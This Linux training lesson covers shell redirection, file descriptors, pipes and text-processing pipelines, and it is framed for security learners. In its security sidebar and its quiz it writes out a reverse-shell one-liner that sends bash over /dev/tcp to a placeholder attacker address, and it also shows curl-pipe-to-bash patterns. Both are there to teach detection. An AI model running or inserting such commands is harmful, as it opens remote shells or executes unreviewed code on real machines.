# 📖 Lesson 07 – Shell Redirection & Pipes

## Learning Outcomes
By the end of this lesson, you will be able to:
- Explain standard input, output, and error (stdin, stdout, stderr) and their file descriptors
- Redirect command output to files, and redirect input from files
- Chain commands together with pipes to build multi-stage workflows
- Combine redirection and pipes with common text-processing tools (`grep`, `awk`, `sort`, `wc`)
- Recognize how redirection and pipes are used in both legitimate scripting and offensive tooling

## Estimated Study Time
55 minutes (including lab)

## Difficulty
🔴 Intermediate–Advanced

## Prerequisites
- Lesson 03: Processes (redirection affects a process's file descriptors)
- Comfortable running basic commands

## Key Terms
| Term | Definition |
|---|---|
| **stdin** | Standard input, file descriptor 0 — where a program reads input from by default |
| **stdout** | Standard output, file descriptor 1 — where a program writes normal output |
| **stderr** | Standard error, file descriptor 2 — where a program writes error messages |
| **File descriptor** | A numbered handle the kernel uses to track an open input/output stream for a process |
| **Redirection** | Sending a stream to/from a file instead of the terminal, using `>`, `>>`, `<` |
| **Pipe** | Connecting one command's stdout directly to another command's stdin, using `\|` |
| **Reverse shell** | A shell session where stdin/stdout/stderr are redirected over a network connection to an attacker |

## Introduction
Every Linux command is really just a program reading from and writing to numbered streams. By default, stdin comes from your keyboard and stdout/stderr go to your terminal — but the shell lets you rewire those connections freely. Redirection sends a stream to or from a file; pipes connect one command's output directly into another command's input. Together, these two mechanisms are what let Linux's philosophy of "many small tools, each doing one thing well" actually work in practice.

## Why This Matters
Redirection and pipes are the backbone of both legitimate shell scripting/log analysis and a huge portion of offensive tooling. Log analysis (`grep | awk | sort | uniq -c`), automation scripts, and data pipelines all depend on this mechanism. On the offensive/defensive side, the exact same primitive — redirecting stdin/stdout/stderr — is what makes a reverse shell work. Understanding redirection deeply means understanding both how to build efficient command-line workflows and how to recognize a core building block of many attacks.

## Cybersecurity Insight
A classic reverse shell one-liner — `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` — is entirely built from redirection concepts covered in this lesson: it opens a TCP connection as a pseudo-file, redirects stdout and stderr (`>&`) into that connection, and redirects stdin (`0>&1`) back from it, effectively giving a remote attacker an interactive shell over the network. Recognizing this pattern — and the general shape of `/dev/tcp/`, unusual `>&` constructs, or piping to `nc`/`bash` — in scripts, cron jobs, or shell history is a valuable detection skill.

## Researcher's Note
Malware analysts and incident responders frequently review shell history files (`~/.bash_history`) and script contents specifically for redirection patterns that don't match normal administrative activity — piping downloaded content directly into a shell (`curl http://example.com/x.sh | bash`) is a frequently abused pattern because it executes code without ever writing a reviewable file to disk first, and is correspondingly treated as a major red flag during forensic review.

## Real-World Example
The "curl pipe bash" pattern (`curl -sSL https://some-url/install.sh | bash`), while used by some legitimate software installers, is also a well-documented technique used to deliver and execute malicious payloads — because the script's contents are never saved to disk for a user to inspect before execution, and because if the download were ever tampered with (compromised server, machine-in-the-middle), the victim would have no opportunity to notice before it ran with their privileges. Security guidance consistently recommends downloading and reviewing such scripts before executing them, specifically because of this redirection-driven blind trust.

---

## Standard Streams and Basic Redirection

Every process has (at minimum) three standard streams, referenced by file descriptor number:
```
0 = stdin   (input)
1 = stdout  (normal output)
2 = stderr  (error output)
```

**Output redirection:**
```bash
echo "hello" > file.txt       # overwrite file.txt with "hello"
echo "world" >> file.txt      # append "world" to file.txt
```
`>` **overwrites** the destination file completely; `>>` **appends**. Confusing the two is one of the most common (and most damaging) shell mistakes — `>` will silently destroy existing file content with no warning.

**Input redirection:**
```bash
sort < unsorted.txt           # feed unsorted.txt as sort's stdin
```

**Error redirection:**
```bash
command 2> errors.log                # send only stderr to a file
command > output.log 2> errors.log   # separate files for stdout and stderr
command > combined.log 2>&1          # send BOTH stdout and stderr to the same file
command &> combined.log              # shorthand for the line above (bash-specific)
command > /dev/null 2>&1             # discard all output entirely
```
Order matters in `2>&1` constructs: `command > file 2>&1` redirects stdout to `file`, *then* points stderr at wherever stdout currently points (the same file) — reversing the order (`command 2>&1 > file`) produces a different result, sending stderr to the terminal and only stdout to the file, which is a subtle and common bug.

## Pipes — Connecting Commands

A pipe (`|`) connects one command's stdout directly to the next command's stdin, without ever touching disk:
```bash
ps aux | grep nginx
cat access.log | grep "404" | wc -l
history | grep ssh
```
Pipes can be chained indefinitely, and this is where Linux's small-tools philosophy shines — each command does one job, and pipes compose them into a pipeline:
```bash
cat /var/log/auth.log | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -rn | head -10
```
This single pipeline (a real, commonly used one) extracts failed SSH login attempts, pulls out the source IP, counts occurrences per IP, and shows the top 10 offenders — a genuinely useful log-analysis one-liner built entirely from redirection concepts.

`tee` is a useful companion — it writes stdout to a file *and* passes it along the pipeline simultaneously, instead of forcing a choice between the two:
```bash
ps aux | tee process_snapshot.txt | grep nginx
```

## Practical Text-Processing Combinations

Common building blocks worth being fluent in, since they appear constantly in both administration and log/forensic analysis:

| Tool | Purpose |
|---|---|
| `grep` | Filter lines matching a pattern (`grep -v` inverts, `grep -i` case-insensitive, `grep -c` counts) |
| `awk` | Field-based text processing (`awk '{print $1}'` prints the first whitespace-separated field) |
| `sed` | Stream editing / substitution (`sed 's/old/new/g'`) |
| `sort` | Sort lines (`sort -n` numeric, `sort -r` reverse) |
| `uniq` | Collapse adjacent duplicate lines (`uniq -c` counts occurrences — must be sorted first) |
| `wc` | Word/line/byte counts (`wc -l` counts lines) |
| `cut` | Extract columns by delimiter or character position |
| `xargs` | Turn piped input into arguments for another command |

Example combinations:
```bash
who | wc -l                                   # count logged-in users
cat /etc/passwd | cut -d: -f1                  # list all usernames
ls -la | grep "^-rwx"                          # list files with owner-execute permission
find / -name "*.log" 2>/dev/null | xargs grep -l "ERROR"   # find log files containing "ERROR"
```

---

## Tips
- When a pipeline isn't producing expected results, test it stage by stage — run the first command alone, confirm its output, then add the next stage, and so on.
- Redirect stderr to `/dev/null` (`2>/dev/null`) when you want a cleaner view of a command's normal output, but remember you're now hiding errors, not fixing them.
- `uniq -c` only collapses *adjacent* duplicate lines — always `sort` first if you want an accurate count of all duplicates in unsorted input.

## Common Mistakes
- Using `>` when you meant `>>`, silently overwriting a file's previous contents.
- Piping `curl`/`wget` output directly into `bash` or `sh` without reviewing the script first.
- Forgetting that `2>&1` must come *after* the stdout redirection to work as intended (`> file 2>&1`, not `2>&1 > file`).
- Running `uniq -c` on unsorted input and getting a misleadingly low duplicate count.

## Common Misconceptions
- **"Pipes write intermediate data to temporary files."** Pipes connect streams directly through the kernel (typically via an in-memory buffer); no temporary file is created, which is part of why pipelines are fast and don't leave forensic artifacts on disk the way a series of `> file` redirections would.
- **"`2>&1` and `2>1` do the same thing."** `2>&1` redirects file descriptor 2 to *wherever descriptor 1 currently points*; `2>1` (without the `&`) would instead try to redirect stderr into a literal file named `1` — a very common typo with a very different effect.
- **"Piping is only useful for quick one-off commands, not real work."** Production log analysis, monitoring scripts, and even parts of malware analysis workflows regularly rely on multi-stage pipelines exactly like the SSH brute-force example above.

## Quick Practice
```bash
printf "banana\napple\ncherry\napple\n" > fruit.txt
sort fruit.txt | uniq -c
grep "a" fruit.txt | wc -l
```
Predict each output before running it, then confirm.

## Knowledge Check
1. What's the difference between `>` and `>>`?
2. Why must input be sorted before piping into `uniq -c` for accurate counts?
3. What does the reverse shell one-liner `bash -i >& /dev/tcp/IP/PORT 0>&1` actually do, in terms of stream redirection?
4. Why is `curl url | bash` considered risky compared to `curl url -o script.sh` followed by manually inspecting and then running the script?
5. What's the correct order for redirecting both stdout and stderr to the same file, and why does order matter?

<details>
<summary>Answers</summary>

1. `>` overwrites the destination file; `>>` appends to it without deleting existing content.
2. `uniq -c` only collapses *adjacent* identical lines; unsorted input can have duplicates scattered non-adjacently, causing them to be undercounted.
3. It redirects the interactive shell's stdout/stderr into a TCP connection to the attacker (`>&`) and redirects stdin back from that same connection (`0>&1`), giving the attacker an interactive remote shell.
4. Piping directly to `bash` executes the downloaded content immediately with no opportunity to review it first, meaning any tampering (malicious server, MITM) executes with the victim's privileges before it can be detected.
5. `command > file 2>&1` — stdout is redirected to the file first, then stderr is pointed at wherever stdout now points; reversing the order sends stderr to the original terminal instead.
</details>

## Best Practices
- Always download and review scripts before executing them, rather than piping directly from `curl`/`wget` into a shell.
- Use `>>` deliberately and `>` cautiously — consider `set -o noclobber` in scripts to prevent accidental overwrites.
- Build and test multi-stage pipelines incrementally, one stage at a time.
- Use `tee` when you need to both persist output to a file and continue processing it in the same pipeline.
- When reviewing logs or shell history for signs of compromise, specifically look for `/dev/tcp/`, unusual `>&` redirection, and "pipe to shell" patterns.

## Summary
Redirection and pipes let you rewire a program's input and output streams and chain simple, single-purpose tools into powerful workflows — the practical expression of Unix's core design philosophy. The same primitives that power everyday log analysis (`grep | awk | sort | uniq -c`) also underlie reverse shells and "pipe to shell" installation patterns, making fluency here valuable for both legitimate administration and security analysis.

## What's Next?
This wraps up the core lesson content for the module. From here, use the module-wide **[Troubleshooting Guide](troubleshooting-guide.md)** whenever you hit an unexpected error across any topic, and keep the **[Cheat Sheet](cheatsheet.md)** open as a quick reference while you continue practicing.

---


## Navigation
⬅️ [Previous: Lesson 06 – Environment Variables](06-environment-variables.md) | [ Lab 07: shell redirection pipes](../../labs/module-02/07-shell-redirection-pipes.md) | ➡️ [Troubleshooting Guide](../../Troubleshooting/Module-02.md)
